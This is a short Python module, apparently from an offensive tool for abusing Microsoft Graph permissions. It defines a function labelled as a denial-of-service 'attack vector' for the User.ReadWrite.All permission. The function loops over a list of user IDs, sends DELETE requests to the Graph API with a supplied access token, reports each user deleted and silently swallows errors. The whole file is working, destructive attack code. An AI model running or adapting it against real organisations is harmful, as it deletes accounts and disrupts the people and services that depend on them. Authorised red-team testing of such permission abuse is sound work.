import requests
import colorama
from colorama import Fore, Style


def UserRW_Vectors(request_headers, UserRWSettings):
    print()
    print("User.ReadWrite.All - Allows the app to read and write the full set of profile properties, reports, "
          "and managers of other users in your organization, on behalf of the signed-in user.")
    print()
    try:
        print("Attack vector - Dos (delete users).")

        for user in UserRWSettings['users']:
            create_message_URL = "https://graph.microsoft.com/v1.0/users/" + user
            result = requests.delete(create_message_URL, headers=request_headers)
            code = result.status_code
            if code == 204:
                print(Fore.GREEN + "Deleted user " + user)
            else:
                print("Action did not worked.")
    except:
        pass